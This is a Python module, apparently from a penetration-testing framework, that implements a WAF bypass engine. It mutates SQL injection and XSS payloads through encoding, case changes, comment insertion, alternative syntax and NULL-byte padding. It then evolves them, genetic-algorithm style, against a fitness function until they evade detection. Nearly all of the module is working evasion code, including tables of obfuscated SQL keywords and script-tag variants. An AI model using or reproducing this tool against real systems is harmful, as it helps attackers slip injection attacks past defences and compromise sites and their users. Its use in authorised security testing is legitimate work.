"""
WAF Payload Mutator - WAFバイパス用ペイロードミューテーション

WAF検知を回避するためのペイロード変異エンジン。
遺伝的アルゴリズム風のミューテーション戦略を採用。

用途:
- ブロックされたペイロードの自動変異
- WAFルール推測と回避
- 成功パターンの学習
"""

import logging
import random
import secrets
import re  # Added import
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Callable, Tuple
from enum import Enum

from src.core.utils.payload_encoder import PayloadEncoder

logger = logging.getLogger(__name__)


class MutationType(Enum):
    """ミューテーションタイプ"""
    ENCODE = "encode"           # エンコーディング変更
    CASE = "case"               # 大小文字変更
    WHITESPACE = "whitespace"   # 空白文字操作
    COMMENT = "comment"         # コメント挿入
    CONCAT = "concat"           # 文字列分割/結合
    CHARSET = "charset"         # 文字セット変更
    SYNTAX = "syntax"           # 構文変更
    PADDING = "padding"         # パディング追加


@dataclass
class MutatedPayload:
    """変異ペイロード"""
    original: str
    mutated: str
    mutations: List[MutationType]
    generation: int = 0
    fitness: float = 0.0  # 成功度（0-1）
    
    def to_dict(self) -> Dict:
        return {
            "original": self.original,
            "mutated": self.mutated,
            "mutations": [m.value for m in self.mutations],
            "generation": self.generation,
            "fitness": self.fitness,
        }


class WAFPayloadMutator:
    """
    WAF Payload Mutator
    
    機能:
    - 複数のミューテーション戦略
    - 遺伝的アルゴリズム風の進化
    - 成功パターンの学習と優先
    - WAFシグネチャ推測
    """
    
    # 空白文字の代替
    WHITESPACE_ALTERNATIVES = [
        # " ",      # 通常スペース (Removed to ensure mutation)
        "\t",     # タブ
        "\n",     # 改行
        "\r",     # CR
        "%09",    # タブ（URLエンコード）
        "%0a",    # LF（URLエンコード）
        "%0d",    # CR（URLエンコード）
        "%20",    # スペース（URLエンコード）
        "/**/",   # SQLコメント
        "/*!*/",  # MySQL条件付きコメント
    ]
    
    # SQLキーワードの代替構文
    SQL_ALTERNATIVES = {
        "SELECT": ["SeLeCt", "SELECT/**/", "SEL%45CT", "/*!SELECT*/"],
        "UNION": ["UnIoN", "UN/**/ION", "UNI%4fN", "/*!UNION*/"],
        "FROM": ["FrOm", "FR/**/OM", "FR%4fM"],
        "WHERE": ["WhErE", "WH/**/ERE", "WH%45RE"],
        "AND": ["AnD", "AN/**/D", "&&", "%26%26"],
        "OR": ["oR", "O/**/R", "||", "%7c%7c"],
        "=": ["LIKE", "REGEXP", "RLIKE", "<>", "!="],
    }
    
    # XSSの代替構文
    XSS_ALTERNATIVES = {
        "<script>": ["<ScRiPt>", "<script >", "<script\t>", "<script\n>"],
        "</script>": ["</ScRiPt>", "</script >", "</script\t>"],
        "javascript:": ["JaVaScRiPt:", "javascript\t:", "&#106;avascript:"],
        "onerror": ["OnErRoR", "onerror\t", "on\nerror"],
        "alert": ["al\\u0065rt", "al\\\\u0065rt", "prompt", "confirm"],
    }
    
    def __init__(
        self,
        mutation_rate: float = 0.3,
        population_size: int = 10,
        max_generations: int = 5,
    ):
        """
        Args:
            mutation_rate: ミューテーション確率
            population_size: 1世代の個体数
            max_generations: 最大世代数
        """
        self.mutation_rate = mutation_rate
        self.population_size = population_size
        self.max_generations = max_generations
        self.encoder = PayloadEncoder()
        self.successful_mutations: List[MutatedPayload] = []
    
    def mutate(
        self,
        payload: str,
        mutations: Optional[List[MutationType]] = None,
    ) -> List[MutatedPayload]:
        """
        ペイロードをミューテーション
        
        Args:
            payload: 元のペイロード
            mutations: 適用するミューテーションタイプ
        
        Returns:
            変異ペイロードのリスト
        """
        if mutations is None:
            mutations = list(MutationType)
        
        results = []
        
        for mutation_type in mutations:
            mutated = self._apply_mutation(payload, mutation_type)
            if mutated != payload:
                results.append(MutatedPayload(
                    original=payload,
                    mutated=mutated,
                    mutations=[mutation_type],
                    generation=0,
                ))
        
        return results
    
    def evolve(
        self,
        payload: str,
        fitness_func: Callable[[str], float],
    ) -> List[MutatedPayload]:
        """
        遺伝的アルゴリズム風にペイロードを進化
        
        Args:
            payload: 初期ペイロード
            fitness_func: 適合度評価関数（0-1を返す）
        
        Returns:
            進化したペイロードのリスト（適合度順）
        """
        # 初期集団
        population = self._create_initial_population(payload)
        
        for gen in range(self.max_generations):
            # 適合度評価
            for individual in population:
                individual.fitness = fitness_func(individual.mutated)
                individual.generation = gen
            
            # 成功したものを保存
            successful = [p for p in population if p.fitness > 0.5]
            self.successful_mutations.extend(successful)
            
            # 完全成功があれば終了
            if any(p.fitness >= 0.9 for p in population):
                break
            
            # 選択と交叉
            population = self._evolve_population(population, payload)
        
        # 最終評価
        for individual in population:
            if individual.fitness == 0.0:
                individual.fitness = fitness_func(individual.mutated)
        
        return sorted(population, key=lambda x: x.fitness, reverse=True)
    
    def _create_initial_population(
        self,
        payload: str,
    ) -> List[MutatedPayload]:
        """初期集団作成"""
        population = []
        
        # 各ミューテーションタイプで1つずつ
        for mutation_type in MutationType:
            mutated = self._apply_mutation(payload, mutation_type)
            population.append(MutatedPayload(
                original=payload,
                mutated=mutated,
                mutations=[mutation_type],
            ))
        
        # 複合ミューテーション
        while len(population) < self.population_size:
            num_mutations = random.randint(2, 4)
            types = random.sample(list(MutationType), num_mutations)
            
            mutated = payload
            for t in types:
                mutated = self._apply_mutation(mutated, t)
            
            population.append(MutatedPayload(
                original=payload,
                mutated=mutated,
                mutations=types,
            ))
        
        return population[:self.population_size]
    
    def _evolve_population(
        self,
        population: List[MutatedPayload],
        original: str,
    ) -> List[MutatedPayload]:
        """集団を進化"""
        # 上位を選択
        sorted_pop = sorted(population, key=lambda x: x.fitness, reverse=True)
        elite = sorted_pop[:2]  # エリート保存
        
        new_population = list(elite)
        
        while len(new_population) < self.population_size:
            # 親選択（ルーレット選択）
            parent = self._select_parent(sorted_pop)
            
            # ミューテーション
            new_mutation = random.choice(list(MutationType))
            new_mutated = self._apply_mutation(parent.mutated, new_mutation)
            
            new_individual = MutatedPayload(
                original=original,
                mutated=new_mutated,
                mutations=parent.mutations + [new_mutation],
            )
            new_population.append(new_individual)
        
        return new_population
    
    def _select_parent(
        self,
        population: List[MutatedPayload],
    ) -> MutatedPayload:
        """親選択（ルーレット選択）"""
        total_fitness = sum(p.fitness + 0.1 for p in population)  # 0除算防止
        pick = random.uniform(0, total_fitness)
        current = 0
        
        for p in population:
            current += p.fitness + 0.1
            if current >= pick:
                return p
        
        return population[-1]
    
    def _apply_mutation(
        self,
        payload: str,
        mutation_type: MutationType,
    ) -> str:
        """単一ミューテーション適用"""
        if mutation_type == MutationType.ENCODE:
            return self._mutate_encode(payload)
        elif mutation_type == MutationType.CASE:
            return self._mutate_case(payload)
        elif mutation_type == MutationType.WHITESPACE:
            return self._mutate_whitespace(payload)
        elif mutation_type == MutationType.COMMENT:
            return self._mutate_comment(payload)
        elif mutation_type == MutationType.CONCAT:
            return self._mutate_concat(payload)
        elif mutation_type == MutationType.CHARSET:
            return self._mutate_charset(payload)
        elif mutation_type == MutationType.SYNTAX:
            return self._mutate_syntax(payload)
        elif mutation_type == MutationType.PADDING:
            return self._mutate_padding(payload)
        return payload
    
    def _mutate_encode(self, payload: str) -> str:
        """エンコーディング変更"""
        encodings = [
            self.encoder.url_encode,
            self.encoder.double_url_encode,
            self.encoder.unicode_encode,
            self.encoder.hex_encode,
        ]
        return random.choice(encodings)(payload)
    
    def _mutate_case(self, payload: str) -> str:
        """大小文字変更"""
        return self.encoder.mixed_case(payload)
    
    def _mutate_whitespace(self, payload: str) -> str:
        """空白文字操作"""
        alt = random.choice(self.WHITESPACE_ALTERNATIVES)
        return payload.replace(" ", alt)
    
    def _mutate_comment(self, payload: str) -> str:
        """コメント挿入"""
        style = random.choice(["sql", "html"])
        return self.encoder.insert_comments(payload, style)
    
    def _mutate_concat(self, payload: str) -> str:
        """文字列分割"""
        style = random.choice(["sql", "js"])
        return self.encoder.concat_chunks(payload, 2, style)
    
    def _mutate_charset(self, payload: str) -> str:
        """文字セット変更（Unicode正規化）"""
        # 一部の文字をUnicodeエスケープ
        result = ""
        for c in payload:
            if random.random() < 0.3 and c.isalpha():
                result += f"\\u{ord(c):04x}"
            else:
                result += c
        return result
    
    def _mutate_syntax(self, payload: str) -> str:
        """構文変更（代替構文）"""
        result = payload
        
        # SQL構文変更
        for original, alternatives in self.SQL_ALTERNATIVES.items():
            if original.lower() in result.lower():
                alt = random.choice(alternatives)
                # 大文字小文字を無視して置換 (Lambda使用でエスケープ問題を回避)
                result = re.sub(re.escape(original), lambda m: alt, result, flags=re.IGNORECASE, count=1)
        
        # XSS構文変更
        for original, alternatives in self.XSS_ALTERNATIVES.items():
            if original.lower() in result.lower():
                alt = random.choice(alternatives)
                result = re.sub(re.escape(original), lambda m: alt, result, flags=re.IGNORECASE, count=1)
        
        return result
    
    def _mutate_padding(self, payload: str) -> str:
        """パディング追加"""
        paddings = [
            ("", ""),           # なし
            (" ", ""),          # 前にスペース
            ("", " "),          # 後にスペース
            ("/**/", ""),       # 前にコメント
            ("", "/**/"),       # 後にコメント
            ("\t\n", ""),       # 前に制御文字
            ("%00", ""),        # 前にNULL
        ]
        prefix, suffix = random.choice(paddings)
        return prefix + payload + suffix
    
    def get_successful_patterns(self) -> List[MutatedPayload]:
        """成功したパターンを取得"""
        return sorted(self.successful_mutations, key=lambda x: x.fitness, reverse=True)
    
    def get_summary(self) -> Dict:
        """サマリー"""
        by_type = {}
        for p in self.successful_mutations:
            for m in p.mutations:
                by_type[m.value] = by_type.get(m.value, 0) + 1
        
        return {
            "successful_count": len(self.successful_mutations),
            "by_mutation_type": by_type,
            "avg_fitness": sum(p.fitness for p in self.successful_mutations) / max(len(self.successful_mutations), 1),
        }


def create_waf_mutator(
    mutation_rate: float = 0.3,
    population_size: int = 10,
) -> WAFPayloadMutator:
    """WAFPayloadMutator作成ヘルパー"""
    return WAFPayloadMutator(
        mutation_rate=mutation_rate,
        population_size=population_size,
    )
